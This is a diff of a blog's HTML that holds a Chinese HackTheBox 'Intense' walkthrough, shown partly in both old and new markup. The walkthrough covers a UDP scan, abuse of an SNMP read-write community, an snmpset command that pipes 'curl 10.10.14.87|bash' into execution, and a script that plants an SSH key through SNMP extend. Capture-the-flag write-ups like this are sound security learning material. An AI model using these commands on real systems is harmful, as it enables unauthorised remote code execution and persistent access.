+ master          agentx</code></pre><p>看到这个udp我就估计不妙，自己探测端口时肯定又忘记扫udp了。而且从这个snmp.conf中可以看到一个关键组<code>SuP3RPrivCom90</code>属于<code>rwcommunity</code>有着读写权限。于是我去搜索了下snmp相关漏洞,发现真的可以达成getshell</p>
 <p>先nmap扫下确认</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Jul 19 11:05:42 2020 as: nmap -sU -sC -oA nmap/intense-udp 10.10.10.195</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.195</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">161/udp open  snmp</span><br><span class="line">| snmp-info: </span><br><span class="line">|   enterprise: net-snmp</span><br><span class="line">|   engineIDFormat: unknown</span><br><span class="line">|   engineIDData: f20383648c26d05d00000000</span><br><span class="line">|   snmpEngineBoots: 603</span><br><span class="line">|_  snmpEngineTime: 10h34m03s</span><br><span class="line">| snmp-sysdescr: Linux intense 4.15.0-55-generic <span class="comment">#60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64</span></span><br><span class="line">|_  System uptime: 10h34m3.40s (3804340 timeticks)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Sun Jul 19 11:26:16 2020 -- 1 IP address (1 host up) scanned in 1234.34 seconds</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash"># Nmap 7.80 scan initiated Sun Jul 19 11:05:42 2020 as: nmap -sU -sC -oA nmap/intense-udp 10.10.10.195
+Nmap scan report for 10.10.10.195
+Host is up (0.43s latency).
+Not shown: 999 closed ports
+PORT    STATE SERVICE
+161/udp open  snmp
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: f20383648c26d05d00000000
+|   snmpEngineBoots: 603
+|_  snmpEngineTime: 10h34m03s
+| snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
+|_  System uptime: 10h34m3.40s (3804340 timeticks)
+
+# Nmap done at Sun Jul 19 11:26:16 2020 -- 1 IP address (1 host up) scanned in 1234.34 seconds</code></pre>
 <p>果然配置不是localhost:161的话我们是可以外网直接访问的。接下来就是根据网上的文章进行了解了。<br><a href="https://digi.ninja/blog/snmp_to_shell.php" target="_blank" rel="noopener">https://digi.ninja/blog/snmp_to_shell.php</a><br> 需要注意的是。要是出现了跟文章中一开始一样的报错,需要按照这篇 <a href="https://docs.linuxconsulting.mn.it/notes/net-snmp-errors" target="_blank" rel="noopener">文章</a>进行相关下载。我的kali默认也是会报错的,需要下载额外的依赖并修改配置。</p>
 <p> 成功运行<code>snmpwalk -v2c -c SuP3RPrivCom90  10.10.10.195  nsExtendOutput1</code>的话是这样的<br><img src="/2020/07/22/hackthebox-Intense/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br> 从文章中了解到,如果直接修改conf文件,是可以利用extend 这一部分可执行命令的特点来进行恶意命令的插入。那么我们现在在远程,还有方法可以直接修改或者插入名令吗？当然是可以的。我很快找到了这篇文章。<br> <a href="https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/</a></p>
-<p>稍微调用下nsExtendObjects。会发现它会把extend里的命令都执行一回。<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~<span class="comment"># snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects</span></span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 6</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="string">"test"</span> = STRING: /bin/bash</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="string">"test1"</span> = STRING: /bin/<span class="built_in">echo</span></span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="string">"test2"</span> = STRING: <span class="built_in">echo</span></span><br></pre></td></tr></table></figure><br>这里test本来不应该存在的。应该是其他人创建了这个变量。而它是<code>/bin/.bash</code>调用的。所以我直接拿来修改值</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195   <span class="string">'nsExtendArgs."test"'</span> = <span class="string">'-c "curl 10.10.14.87|bash"'</span></span><br><span class="line"></span><br><span class="line">snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects</span><br></pre></td></tr></table></figure>
+<p>稍微调用下nsExtendObjects。会发现它会把extend里的命令都执行一回。</p>
+<pre><code class="bash">root@byc404:~# snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 6
+NET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;test&quot; = STRING: /bin/bash
+NET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;test1&quot; = STRING: /bin/echo
+NET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;test2&quot; = STRING: echo
+</code></pre>
+<p>这里test本来不应该存在的。应该是其他人创建了这个变量。而它是<code>/bin/.bash</code>调用的。所以我直接拿来修改值</p>
+<pre><code class="bash">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195   &#39;nsExtendArgs.&quot;test&quot;&#39; = &#39;-c &quot;curl 10.10.14.87|bash&quot;&#39;
+
+snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects</code></pre>
 <p><img src="/2020/07/22/hackthebox-Intense/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>getshell</p>
 <p>这里我第一次试成功了,后来因为pwn不会就退出了。等第二天再尝试同样的方法getshell却发现总是返回timeout。换了vpn后不返回timeout却执行不了curl命令了……怀疑是curl的timeout有5s左右达到了snmptimeout的上限，所以执行不了curl.于是换了一个思路。我们总归是要通过访问靶机的5001来pwn到root的。那直接写ssh公钥然后端口转发也可以。</p>
 <p>索性写个sh</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -f ./intense -q -N <span class="string">""</span></span><br><span class="line">key=$(cat intense.pub)</span><br><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \</span><br><span class="line">    <span class="string">"nsExtendStatus.\"test\""</span>  = createAndGo \</span><br><span class="line">    <span class="string">"nsExtendCommand.\"test\""</span> = /bin/bash \</span><br><span class="line">    <span class="string">"nsExtendArgs.\"test\""</span>    = <span class="string">"-c \"echo <span class="variable">$&#123;key&#125;</span> &gt;&gt; ~/.ssh/authorized_keys\""</span></span><br><span class="line">snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects</span><br><span class="line">ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">#!/bin/bash
 
+ssh-keygen -f ./intense -q -N &quot;&quot;
+key=$(cat intense.pub)
+snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \
+    &quot;nsExtendStatus.\&quot;test\&quot;&quot;  = createAndGo \
+    &quot;nsExtendCommand.\&quot;test\&quot;&quot; = /bin/bash \
+    &quot;nsExtendArgs.\&quot;test\&quot;&quot;    = &quot;-c \&quot;echo ${key} &gt;&gt; ~/.ssh/authorized_keys\&quot;&quot;
+snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects
+ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense</code></pre>
 <p>这样整体执行起来不会因为连续的timeout导致手敲太多代码。</p>
 <h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>因为不会所以拜托别人了。一个保护全开的栈溢出。涉及到一些socket知识。具体就参考jaubert的记录了</p>
 <p><a href="https://jaubert.gitee.io/crackme/" target="_blank" rel="noopener">https://jaubert.gitee.io/crackme/</a></p>
@@ -739,7 +1462,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -751,9 +1474,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -886,6 +1609,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1099,7 +1824,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1155,6 +1880,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
